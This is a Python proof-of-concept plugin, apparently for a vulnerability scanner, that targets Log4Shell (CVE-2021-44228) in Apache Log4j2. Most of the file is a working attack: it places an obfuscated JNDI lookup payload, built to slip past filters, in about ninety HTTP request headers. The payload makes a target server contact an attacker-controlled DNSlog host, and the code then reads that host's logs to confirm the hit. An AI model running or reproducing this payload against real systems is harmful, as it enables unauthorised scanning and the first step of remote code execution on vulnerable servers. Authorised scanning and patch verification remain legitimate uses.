# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua, get_dnslogCN, check_dnslogCN, gen_title
from lib.core.poc import POCBase
from lib.core.dnslog import dnslog
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "Log4shell(CVE-2021-44228)",  # 漏洞名称
        "VulnID": "CVE-2021-44228",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "Apache Log4j2",  # 漏洞应用名称
        "AppVersion": "2.0 <= Apache log4j <= 2.14.1",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            CVE-2021-44228（又名 log4shell）是 Apache Log4j 库中的一个远程代码执行漏洞，该库是一种基于 Java 的日志记录工具，广泛用于世界各地的应用程序中。
            此漏洞允许可以控制日志消息的攻击者执行从攻击者控制的服务器加载的任意代码——我们预计大多数使用 Log4j 库的应用程序都将满足此条件。
        """,  # 漏洞简要描述

        "fofa-dork": """
        
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        url = self.target + ""  # url自己按需调整

        # success, dns_flag = get_dnslogCN()
        # if success == False:
        #     return [False, dns_flag]
        dnsflag = dnslog()
        subdomain = dnsflag.get_dnslog()

        payload = "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s/j}"
        headers = {
            "Connection": "close",
            "Accept": payload % ("accept." + subdomain),
            "Accept-Encoding": payload % ("acceptencoding." + subdomain),
            "Accept-Language": payload % ("acceptlanguage." + subdomain),
            "Access-Control-Request-Headers": payload % ("accescontrolrequestheaders." + subdomain),
            "Access-Control-Request-Method": payload % ("accesscontrolrequestmethod." + subdomain),
            "Authentication": "Basic " + payload % ("authentication." + subdomain),
            # "Authentication": "Bearer " + payload % "authentication",
            "Accept-Charset": payload % ("acceptcharset." + subdomain),
            "Accept-Datetime": payload % ("acceptdatetime." + subdomain),
            "Cookie": payload % ("cookie." + subdomain) + "=" + payload % ("cookie." + subdomain),
            "Cache-Control": payload % ("cachecontrol." + subdomain),
            "Cf-Connecting_ip": payload % ("cfconnectingip." + subdomain),
            "Client-Ip": payload % ("clientip." + subdomain),
            "Contact": payload % ("contact." + subdomain),
            "DNT": payload % ("dnt." + subdomain),
            "Forwarded": payload % ("forwarded." + subdomain),
            "Forwarded-For": payload % ("forwardedfor." + subdomain),
            "Forwarded-For-Ip": payload % ("forwardedforip." + subdomain),
            "Forwarded-Proto": payload % ("forwardedproto." + subdomain),
            "From": payload % ("from." + subdomain),
            "If-Modified-Since": payload % ("ifmodifiedsince." + subdomain),
            "Location": payload % ("location." + subdomain),
            "Max-Forwards": payload % ("maxforwards." + subdomain),
            "Origin": payload % ("origin." + subdomain),
            "Originating-Ip": payload % ("originatingip." + subdomain),
            "Pragma": payload % ("pragma." + subdomain),
            "Referer": payload % ("referer." + subdomain),
            "TE": payload % ("te." + subdomain),
            "True-Client-IP": payload % ("trueclientip." + subdomain),
            "True-Client-Ip": payload % ("trueclientip." + subdomain),
            "Upgrade": payload % ("upgrade." + subdomain),
            "Upgrade-Insecure-Requests": payload % ("upgradeinsecurerequets." + subdomain),
            "User-Agent": payload % ("useragent." + subdomain),
            "Via": payload % ("via." + subdomain),
            "Warning": payload % ("warning." + subdomain),
            "X-Api-Version": payload % ("xapiversion." + subdomain),
            "X-ATT-DeviceId": payload % ("xattdeviceid." + subdomain),
            "X-Att-Deviceid": payload % ("xattdeviceid." + subdomain),
            "X-CSRFToken": payload % ("xcsrftoken." + subdomain),
            "X-Client-Ip": payload % ("xclientip." + subdomain),
            "X-Correlation-ID": payload % ("xcorrelationid." + subdomain),
            "X-Csrf-Token": payload % ("xcsrftoken." + subdomain),
            "X-Do-Not-Track": payload % ("xdonottrack." + subdomain),
            "X-Druid-Comment": payload % ("xdruidcomment." + subdomain),
            "X-Foo": payload % ("xfoo." + subdomain),
            "X-Foo-Bar": payload % ("xfoobar." + subdomain),
            "X-Forward-For": payload % ("xforwardfor." + subdomain),
            "X-Forward-Proto": payload % ("xforwardproto." + subdomain),
            "X-Forwarded": payload % ("xforwarded." + subdomain),
            "X-Forwarded-By": payload % ("xforwardedby." + subdomain),
            "X-Forwarded-For": payload % ("xforwardedfor." + subdomain),
            "X-Forwarded-For-Original": payload % ("xforwardedfororiginal." + subdomain),
            "X-Forwarded-Host": payload % ("xforwardedhost." + subdomain),
            "X-Forwarded-Port": payload % ("xforwardedport." + subdomain),
            "X-Forwarded-Proto": payload % ("xforwardedproto." + subdomain),
            "X-Forwarded-Protocol": payload % ("xforwardedprotocal." + subdomain),
            "X-Forwarded-Scheme": payload % ("xforwardedscheme." + subdomain),
            "X-Forwarded-Server": payload % ("xforwardedserver." + subdomain),
            "X-Forwarded-Ssl": payload % ("xforwardedssl." + subdomain),
            "X-Forwarder-For": payload % ("xforwardedfor." + subdomain),
            "X-Frame-Options": payload % ("xframeoptions." + subdomain),
            "X-From": payload % ("xfrom." + subdomain),
            "X-Geoip-Country": payload % ("xgeoipcountry." + subdomain),
            "X-HTTP-Method-Override": payload % ("xhttpmethodoverride." + subdomain),
            "X-Http-Destinationurl": payload % ("xhttpdestinationurl." + subdomain),
            "X-Http-Host-Override": payload % ("xhttphostoverride." + subdomain),
            "X-Http-Method": payload % ("xhttpmethod." + subdomain),
            "X-Http-Method-Override": payload % ("xhttpmethodoverride." + subdomain),
            "X-Http-Path-Override": payload % ("xhttppathoverride." + subdomain),
            "X-Https": payload % ("xhttps." + subdomain),
            "X-Htx-Agent": payload % ("xhtxagent." + subdomain),
            "X-Hub-Signature": payload % ("xhubsignature." + subdomain),
            "X-If-Unmodified-Since": payload % ("xifunmodifiedsince." + subdomain),
            "X-Imbo-Test-Config": payload % ("ximbotestconfig." + subdomain),
            "X-Insight": payload % ("xinsight." + subdomain),
            "X-Ip": payload % ("xip." + subdomain),
            "X-Ip-Trail": payload % ("xiptrail." + subdomain),
            "X-Leakix": payload % ("xleakix." + subdomain),
            "X-Origin": payload % ("xorigin." + subdomain),
            "X-Originating-Ip": payload % ("xoriginatingip." + subdomain),
            "X-ProxyUser-Ip": payload % ("xproxyuserip." + subdomain),
            "X-Real-Ip": payload % ("xrealip." + subdomain),
            "X-Remote-Addr": payload % ("xremoteaddr." + subdomain),
            "X-Remote-Ip": payload % ("xremoteip." + subdomain),
            "X-Request-ID": payload % ("xrequestid." + subdomain),
            "X-Requested-With": payload % ("xrequestedwith." + subdomain),
            "X-UIDH": payload % ("xuidh." + subdomain),
            "X-Wap-Profile": payload % ("xwapprofile." + subdomain),
            "X-XSRF-TOKEN": payload % ("xxsrftoken." + subdomain),
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            logs = dnsflag.get_all_log()
            for i in logs:
                if subdomain.lower() in i.lower():
                    vuln = [True, gen_title(i)]
                    return vuln

        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
